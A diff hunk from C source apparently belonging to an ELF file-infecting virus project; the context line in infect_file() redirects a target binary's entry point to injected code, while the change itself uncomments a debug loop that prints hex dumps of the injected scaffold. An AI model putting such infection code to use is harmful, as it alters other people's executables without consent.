@@ -223,21 +223,20 @@ infect_file(volatile char *path, volatile file *file_self) {
     header_target->e_entry = offset_to_addr(&file_target, builder_target_start_offset);
     // TODO: check if all stuff is put into the correct places
     if (file_write(fd_target, &file_target)) ft_exit(44);
-    // char index = 'i';
-    // for (int i = 0; i < scaffold_target_size; i++) {
-    //
-    //     ft_write(1, &index, 1);
-    //     ft_write(1, &nl, 1);
-    //     print_number(i);
-    //     ft_write(1, &nl, 1);
-    //     print_number_hex(*(uint64_t *)(file_target.mem + scaffolt_target_start_offset + i * 16));
-    //     ft_write(1, &nl, 1);
-    //     print_number_hex(*(uint64_t *)(file_target.mem + scaffolt_target_start_offset + i * 16 + 8));
-    //
-    //
-    //     ft_write(1, &nl, 1);
-    //     ft_write(1, &nl, 1);
-    // }
+    char index = 'i';
+    for (int i = 0; i < scaffold_target_size; i++) {
+
+        print_number(i);
+        ft_write(1, &nl, 1);
+        ft_write(1, &index, 1);
+        ft_write(1, &nl, 1);
+        print_number_hex(*(uint64_t *)(file_target.mem + scaffolt_target_start_offset + i * 16));
+        ft_write(1, &nl, 1);
+        print_number_hex(*(uint64_t *)(file_target.mem + scaffolt_target_start_offset + i * 16 + 8));
+
+        ft_write(1, &nl, 1);
+        ft_write(1, &nl, 1);
+    }
     // ft_write(1, &nl, 1);
     // ft_write(1, &nl, 1);
     // ft_write(1, &nl, 1);
